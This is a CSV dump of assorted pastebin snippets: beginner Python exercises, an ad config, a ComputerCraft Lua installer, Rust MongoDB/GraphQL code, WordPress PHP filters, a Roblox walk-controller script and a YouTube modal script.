id,title,username,language,date,content
VRVR1GkG,ejercicios pendientes,teslariu,Python,Thursday 24th of August 2023 01:00:19 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
'''
1) Pedir el ingreso de notas. La condición de salida es nota = -1. 
Luego, mostrar su promedio y el total de notas

2) Hacer un template while true con opciones de calculo de perimetros
y superficies: circulo, cuadrado, etc

      
# 1) 
contador = 0
notas = []
while True:
	nota = int(input(""Ingrese una nota: ""))
	if 0 <= nota <= 10:
		notas.append(nota)
	elif nota == -1:
		break
	else:
		print(""Error en el ingreso de la nota"")

print(f""""""
Total de notas: {len(notas)}
Promedio: {sum(notas)/len(notas):.2f}
"""""")
'''

# 2)
print(""""""
*---------------------------------*
| Cálculo de áreas y perímetros   |
*_________________________________*
"""""")

while True:
	print(""""""
	Menu de opciones:
	-----------------
	1. Círculo
	2. Cuadrado
	3. Rectángulo
	4. Salir
	-----------------
	"""""")
	opcion = input(""Ingrese una opción: "")
	
	if opcion == ""1"":
		radio = float(input(""Ingrese el radio: ""))
		print(f""Area: {3.1416*radio**2:.2f} - Perímetro: {2*3.1416*radio:.2f}"")
		
	elif opcion == ""2"":
		lado = float(input(""Ingrese el lado: ""))
		print(f""Area: {lado**2:.2f} - Perímetro: {4*lado:.2f}"")
		
	elif opcion == ""3"":
		a = float(input(""Ingrese un lado: ""))
		b = float(input(""Ingrese el otro lado: ""))
		print(f""Area: {a * b:.2f} - Perímetro: {2*(a + b):.2f}"")
		
	elif opcion == ""4"":
		print(""Gracias por utilizar este script..."")
		break
		
	else:
		print(""Opción incorrecta"")
		
	
	
	
	
	













"
u9Ntfihp,fake test,bellaoui,JSON,Thursday 24th of August 2023 12:46:30 PM CDT,"{
  ""Ads Controller"": {
    ""Ad Units"": {
      ""Applovin"": {
        ""max_banner_id"": ""698886ceezze74fe3"",
        ""max_interstitial_id"": ""0e35f3e811deb59d"",
        ""max_native_id"": ""44ed7e9f0af8ec88""
      },
      ""IronSource"": {
        ""iron_app_key"": ""139aa0199"",
        ""iron_banner_id"": ""DefaultBanner"",
        ""iron_interstitial_id"": ""DefaultInterstitial"",
        ""iron_native_id"": ""DefaultBanner""
      }
    },
    ""Ads Config"": {
      ""mode_ads_banner"": ""max"",
      ""mode_ads_interstitial"": ""max"",
      ""mode_ads_native"": ""max""
    }
  }
}"
sPWyR2jf,onzOS 2.0 Setup,PolskiWisnia,Lua,Thursday 24th of August 2023 12:14:55 PM CDT,"-- Microcraft NextUI Setup -- 
 
local function aw(...) return write(...) end
local function p(...) return print(...) end
local function s(...) return sleep(...) end
local function tw(...) return term.write(...) end
local function scp(...) return term.setCursorPos(...) end
local function sbc(...) return term.setBackgroundColor(...) end
local function stc(...) return term.setTextColor(...) end
local function tc(...) return term.clear(...) end
local function tcl(...) return term.clearLine(...) end
local function r(...) return shell.run(...) end
local function sp(...) return textutils.slowPrint(...) end
local function sw(...) return textutils.slowWrite(...) end
local function fse(...) return fs.exists(...) end
local function pul(...) return paintutils.loadImage(...) end
local function pud(...) return paintutils.drawImage(...) end
local function pfb(...) return paintutils.drawFilledBox(...) end
local function su(...) return os.shutdown(...) end
local function re(...) return os.reboot(...) end
local function pdp(...) return paintutils.drawPixel(...) end
 
w, h = term.getSize()

pliki = {""https://pastebin.com/raw/KmTjVypd"", ""https://pastebin.com/raw/3V1e5XLS""}

function downloadFile(url, sciezka)
    local response = http.get(url)
    if response then
        local fileContent = response.readAll()
        response.close()
        
        local file = fs.open(sciezka, ""w"")
        file.write(fileContent)
        file.close()
    else
        print(""Instalator napotkal blad z pobieraniem pliku. Jesli wystapi on ponownie uzyj wersji instalatora korzystajacej z API pastebin."")
    end
end

function setupUI()
	pfb(1,1,w,h, colors.blue)
	pfb(1,h,w,h,colors.gray)
	local char1 = ""\149""
	local char2 = ""\131""
	scp(1,1)
	stc(colors.white)
	sbc(colors.blue)
	p(""Instalator onzOS 2.0"")
	scp(1,2)
	p(char2, char2, char2, char2, char2, char2, char2, char2, char2)
end

function welcome()
	setupUI()
	scp(1,4)
	sbc(colors.blue)
	stc(colors.white)
	p[[Witamy w Instalatorze onzOS 2.0! Ten program przeprowadzi Cie przez proces pobrania oraz zainstalowania systemu Microcraft onzOS 2.0 na Twoim komputerze. Podazaj dalej za poleceniami Instalatora, aby kontynuowac]]
	scp(1,12)
	p[[Nacisnij ENTER, aby skonfigurowac komputer jako TERMINAL ODBIORCZY.]]
	p[[Nacisnij BACKSPACE, aby skonfigurowac komputer jako TERMINAL GLOSUJACY]]
	local event, key = os.pullEvent(""key"")
	p(key)
	if key == 14 then
		installVote()
	elseif key == 28 then
		installTerminal()
	else
		welcome()
	end
		
end

function installVote()
	setupUI()
	scp(1,h)
	sbc(colors.gray)
	stc(colors.white)
	write(""Pobieranie plikow systemowych..."")
	paintutils.drawBox(8,12,43,14,colors.white)
	scp(1,3)
	downloadFile(pliki[1], ""/startup"")
	scp(9,13)
	sbc(colors.yellow)
	stc(colors.yellow)
	sp(""******"")
	s(1)
	installVoteStage2()
end

function installTerminal()
	setupUI()
	scp(1,h)
	sbc(colors.gray)
	stc(colors.white)
	write(""Pobieranie plikow systemowych..."")
	paintutils.drawBox(8,12,43,14,colors.white)
	scp(1,3)
	downloadFile(pliki[2], ""/startup"")
	scp(9,13)
	sbc(colors.yellow)
	stc(colors.yellow)
	sp(""******"")
	s(1)
	installTerminalStage2()
end

function installVoteStage2()
	setupUI()
	scp(1,h)
	sbc(colors.gray)
	stc(colors.white)
	write(""Instalowanie ustawien systemowych..."")
	paintutils.drawBox(8,12,43,14,colors.white)
	scp(1,3)
	sbc(colors.blue)
	stc(colors.blue)
	r(""set shell.allow_disk_startup false"")
	file1 = fs.open("".computers"", ""w"")
	file1.close()
	stc(colors.white)
	write(""Podaj HASLO ADMINISTRATORA:"")
	haslo = read()
	file2 = fs.open("".haslo"", ""w"")
	file2.write(haslo)
	file2.close()
	s(1)
	pfb(1,h,w,h,colors.gray)
	stc(colors.white)
	scp(1,h)
	write(""Uruchamianie ponownie..."")
	for i = 9,42 do
		scp(i,13)
		sbc(colors.red)
		stc(colors.red)
		sp(""*"")
	end
	s(1)
	re()
end

function installTerminalStage2()
	setupUI()
	scp(1,h)
	sbc(colors.gray)
	stc(colors.white)
	write(""Instalowanie ustawien systemowych..."")
	paintutils.drawBox(8,12,43,14,colors.white)
	scp(1,3)
	sbc(colors.blue)
	stc(colors.blue)
	r(""set shell.allow_disk_startup false"")
	s(1)
	scp(1,4)
	stc(colors.white)
	write(""Podaj PROTOKOL, LOGIN i HASLO do TERMINALA GLOSUJACEGO onzOS 2.0."")
	protocol = read()
	login = read()
	password = read()
	file1 = fs.open("".prot"", ""w"")
	file1.write(protocol)
	file1.close()
	file2 = fs.open("".pass"", ""w"")
	file2.writeLine(login)
	file2.writeLine(password)
	file2.close()
	pfb(1,h,w,h,colors.gray)
	stc(colors.white)
	scp(1,h)
	write(""Uruchamianie ponownie..."")
	for i = 9,42 do
		scp(i,13)
		sbc(colors.red)
		stc(colors.red)
		sp(""*"")
	end
	s(1)
	re()
end

welcome()

"
8A3G2W0X,READ INT,GigaOrts,C#,Thursday 24th of August 2023 11:54:13 AM CDT,"public int ReadInt()
{
    int result;
    
    do
    {
        Console.Write(""Введите число: "");
    } while (int.TryParse(Console.ReadLine(), out result) == false);
    
    return result;
}"
STfzhWir,Untitled,geminilabs,PHP,Thursday 24th of August 2023 11:54:10 AM CDT,"/**
 * This snippet make a {membership_info} tag available in email notifications
 *
 * @param array $args
 * @param \GeminiLabs\SiteReviews\Modules\Email|\GeminiLabs\SiteReviews\Addon\Notifications\Email $email
 * @return array
 */
add_filter('site-reviews/email/compose', function ($args, $email) {
    $review = glsr()->args($email->data)->review;
    if (empty($review)) {
        return $args;
    }
    if ($user = $review->user()) {
        $membership = ''; // TODO: put the user's membership info here as a string
        $args['template-tags']['membership_info'] = $membership;
    }
    return $args;
}, 10, 2);
"
n2Qab4uG,Untitled,MAKASiNer,Rust,Thursday 24th of August 2023 11:36:34 AM CDT,"use async_graphql::{Enum, InputObject, SimpleObject};
use mongodb::bson::oid::ObjectId;
use serde::{Deserialize, Serialize};

//owner schema
#[derive(Debug, Clone, Serialize, Deserialize, SimpleObject)]
pub struct Owner {
    #[serde(skip_serializing_if = ""Option::is_none"")]
    pub _id: Option<ObjectId>,
    pub name: String,
    pub email: String,
    pub phone: String,
}

#[derive(InputObject)]
pub struct CreateOwner {
    pub name: String,
    pub email: String,
    pub phone: String,
}

#[derive(InputObject)]
pub struct FetchOwner {
    pub _id: String,
}

//project schema
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Enum)]
pub enum Status {
    NotStarted,
    InProgress,
    Completed,
}

#[derive(Debug, Clone, Serialize, Deserialize, SimpleObject)]
pub struct Project {
    #[serde(skip_serializing_if = ""Option::is_none"")]
    pub _id: Option<ObjectId>,
    pub owner_id: String,
    pub name: String,
    pub description: String,
    pub status: Status,
}

#[derive(InputObject)]
pub struct CreateProject {
    pub owner_id: String,
    pub name: String,
    pub description: String,
    pub status: Status,
}

#[derive(InputObject)]
pub struct FetchProject {
    pub _id: String,
}"
a0h2ih5b,Untitled,MAKASiNer,Rust,Thursday 24th of August 2023 11:33:21 AM CDT,"use dotenv::dotenv;
use futures::TryStreamExt;
use std::{env, io::Error};
use mongodb::{
    bson::{doc, oid::ObjectId},
    Client, Collection, Database,
};
use crate::schemas::project_schema::{Owner, Project};

pub struct DBMongo {
    db: Database,
}

impl DBMongo {
    pub async fn init() -> Self {
        dotenv().ok();
        let uri = match env::var(""MONGOURI"") {
            Ok(v) => v.to_string(),
            Err(_) => format!(""Error loading env variable""),
        };
        let client = Client::with_uri_str(uri)
            .await
            .expect(""error connecting to database"");
        let db = client.database(""projectMngt"");
        DBMongo { db }
    }

    fn col_helper<T>(data_source: &Self, collection_name: &str) -> Collection<T> {
        data_source.db.collection(collection_name)
    }

    //Owners logic
    pub async fn create_owner(&self, new_owner: Owner) -> Result<Owner, Error> {
        let new_doc = Owner {
            _id: None,
            name: new_owner.name.clone(),
            email: new_owner.email.clone(),
            phone: new_owner.phone.clone(),
        };
        let col = DBMongo::col_helper::<Owner>(&self, ""owner"");
        let data = col
            .insert_one(new_doc, None)
            .await
            .expect(""Error creating owner"");
        let new_owner = Owner {
            _id: data.inserted_id.as_object_id(),
            name: new_owner.name.clone(),
            email: new_owner.email.clone(),
            phone: new_owner.phone.clone(),
        };
        Ok(new_owner)
    }

    pub async fn get_owners(&self) -> Result<Vec<Owner>, Error> {
        let col = DBMongo::col_helper::<Owner>(&self, ""owner"");
        let mut cursors = col
            .find(None, None)
            .await
            .expect(""Error getting list of owners"");
        let mut owners: Vec<Owner> = Vec::new();
        while let Some(owner) = cursors
            .try_next()
            .await
            .expect(""Error mapping through cursor"")
        {
            owners.push(owner)
        }
        Ok(owners)
    }

    pub async fn single_owner(&self, id: &String) -> Result<Owner, Error> {
        let obj_id = ObjectId::parse_str(id).unwrap();
        let filter = doc! {""_id"": obj_id};
        let col = DBMongo::col_helper::<Owner>(&self, ""owner"");
        let owner_detail = col
            .find_one(filter, None)
            .await
            .expect(""Error getting owner's detail"");
        Ok(owner_detail.unwrap())
    }

    //project logics
    pub async fn create_project(&self, new_project: Project) -> Result<Project, Error> {
        let new_doc = Project {
            _id: None,
            owner_id: new_project.owner_id.clone(),
            name: new_project.name.clone(),
            description: new_project.description.clone(),
            status: new_project.status.clone(),
        };
        let col = DBMongo::col_helper::<Project>(&self, ""project"");
        let data = col
            .insert_one(new_doc, None)
            .await
            .expect(""Error creating project"");
        let new_project = Project {
            _id: data.inserted_id.as_object_id(),
            owner_id: new_project.owner_id.clone(),
            name: new_project.name.clone(),
            description: new_project.description.clone(),
            status: new_project.status.clone(),
        };
        Ok(new_project)
    }

    pub async fn get_projects(&self) -> Result<Vec<Project>, Error> {
        let col = DBMongo::col_helper::<Project>(&self, ""project"");
        let mut cursors = col
            .find(None, None)
            .await
            .expect(""Error getting list of projects"");
        let mut projects: Vec<Project> = Vec::new();
        while let Some(project) = cursors
            .try_next()
            .await
            .expect(""Error mapping through cursor"")
        {
            projects.push(project)
        }
        Ok(projects)
    }

    pub async fn single_project(&self, id: &String) -> Result<Project, Error> {
        let obj_id = ObjectId::parse_str(id).unwrap();
        let filter = doc! {""_id"": obj_id};
        let col = DBMongo::col_helper::<Project>(&self, ""project"");
        let project_detail = col
            .find_one(filter, None)
            .await
            .expect(""Error getting project's detail"");
        Ok(project_detail.unwrap())
    }
}"
Gyxe9a5S,Walk Controller,DrawingJhon,Lua,Thursday 24th of August 2023 11:18:25 AM CDT,"local target = game.Players[""USERNAME_HERE""]

local scr = NLS([[local remote = script:WaitForChild(""Remote"")
local target = script:WaitForChild(""Target"").Value

local tool = Instance.new(""Tool"")
tool.Name = target.Name.."" walk controller""
tool.RequiresHandle = false
tool.CanBeDropped = false

tool.Activated:Connect(function()
	remote:FireServer(owner:GetMouse().Hit.Position)
end)

tool.Parent = owner.Backpack
]], owner.PlayerGui)

local remote = Instance.new(""RemoteEvent"")
remote.Name = ""Remote""
remote.OnServerEvent:Connect(function(player, pos)
	if player ~= owner then return end
	
	target.Character.Humanoid:MoveTo(pos)
end)

local val = Instance.new(""ObjectValue"")
val.Value = target
val.Name = ""Target""

remote.Parent = scr
val.Parent = scr"
VURSjmJX,ACF Wordpress,NeaMitika,PHP,Thursday 24th of August 2023 11:15:34 AM CDT,"function custom_acf_filter_clients_by_photographer( $args, $field, $post_id ) {
    
    $current_user = wp_get_current_user();
    $current_user_id = get_current_user_id();
    
    // Verifica se l'utente che modifica il prodotto ha il ruolo ""fotografo""
    if ( in_array('fotografo', $current_user->roles)) {       

        // Ottieni gli ordini associati all'utente fotografo attuale.
        $args = array(
            'post_type'      => 'shop_order',
            'post_status'    => array('wc-pending', 'wc-processing', 'wc-on-hold', 'wc-completed', 'wc-cancelled', 'wc-refunded', 'wc-failed'), // Ho messo tutti gli stati, dopo lo modifico
            'posts_per_page' => -1,
            'meta_query'     => array(
                array(
                    'key'     => 'seleziona_fotografo_associato',
                    'value'   => $current_user_id,
                    'compare' => '=',
                ),
            ),
        );

        $orders = get_posts( $args );

        // Qui mi crea un array solo con gli id dei clienti che hanno ordini dove dentro è associato un fotografo
        $client_ids = wp_list_pluck( $orders, 'post_author' );

        // Filtra i clienti solo per quelli associati agli ordini del fotografo.
        $args['author__in'] = $client_ids;
    }

    return $args;
}

// Applica la funzione di filtro al campo ""seleziona_cliente"".
add_filter('acf/fields/select/query/name=seleziona_cliente', 'custom_acf_filter_clients_by_photographer', 10, 3);"
iQJkaARY,modal-video-on-click(approved),catfield,JavaScript,Thursday 24th of August 2023 10:48:43 AM CDT,"<script>
var scriptUrl = 'https://www.youtube.com/s/player/21812a9c/www-widgetapi.vflset/www-widgetapi.js';

try {
    var ttPolicy = window.trustedTypes.createPolicy(""youtube-widget-api"", {
        createScriptURL: function (x) {
            return x;
        }
    });
    scriptUrl = ttPolicy.createScriptURL(scriptUrl);
} catch (e) {}

var YT = YT || {
    loading: 0,
    loaded: 0
};

var YTConfig = window.YTConfig || {
    host: ""https://www.youtube.com""
};

let player;
let apiReady = false;
let modalOpened = false; // Added flag to track modal state

// Load the YouTube API
function loadYouTubeAPI() {
    if (!YT.loading) {
        YT.loading = 1;
        var a = document.createElement(""script"");
        a.type = ""text/javascript"";
        a.id = ""www-widgetapi-script"";
        a.src = scriptUrl;
        a.async = true;

        var c = document.currentScript;
        if (c) {
            var n = c.nonce || c.getAttribute(""nonce"");
            if (n) {
                a.setAttribute(""nonce"", n);
            }
        }

        var b = document.getElementsByTagName(""script"")[0];
        b.parentNode.insertBefore(a, b);
    }
}

function onYouTubeIframeAPIReady() {
    apiReady = true;

    if (modalOpened) {
        ModalFlexAndPlayVideo();
    }
}

function resetPlayerAndModal() {
    if (player) {
        player.pauseVideo();
    }
    var modalSection = document.querySelector('.fixed-modal-section');
    modalSection.style.display = 'none';
    modalOpened = false;
}

function ModalFlexAndPlayVideo() {
    var modalSection = document.querySelector('.fixed-modal-section');
    modalSection.style.display = 'flex';
    modalOpened = true;

    if (player) {
        // If player instance already exists, just play it.
        player.playVideo();
        console.log(""Video playing"");
    } else {
        if (apiReady) {
            player = new YT.Player('muteVideoYoutube', {
                events: {
                    'onReady': function (event) {
                        event.target.playVideo();
                        console.log(""Video playing"");
                    }
                }
            });
        } else {
            console.log(""API is not ready yet."");
            loadYouTubeAPI();
            console.log(""Loading YouTube API..."");
        }
    }
}

document.querySelector('.modal-close-btn').addEventListener('click', resetPlayerAndModal);
document.querySelector('.daria-testimonial-photo-block').addEventListener('click', ModalFlexAndPlayVideo);
</script>"
